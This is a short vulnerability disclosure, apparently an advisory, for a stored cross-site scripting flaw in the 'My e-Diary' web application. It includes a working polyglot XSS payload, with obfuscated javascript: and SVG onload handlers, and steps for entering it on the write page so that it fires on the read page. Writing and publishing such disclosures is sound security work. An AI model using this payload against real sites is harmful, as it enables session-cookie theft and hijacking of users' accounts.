## Description:
The My e-Diary application is vulnerable to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied data. An attacker could exploit this issue to run arbitrary scripting code in an unsuspecting user's browser in the context of the affected site. This could allow an attacker to steal cookie-based authentication credentials and launch other attacks.


## Proof of Concept:
+ Go to http://localhost/my-e-diary/write-diary.php in the 'Your Title' section we write the this code triggers the XSS
```
jaVasCript:/-////'/"/**/(//oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--! >\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e
```
+ Then go to 'http://localhost/my-e-diary/read-diary.php' XSS will be triggered and a pop-up will appear.
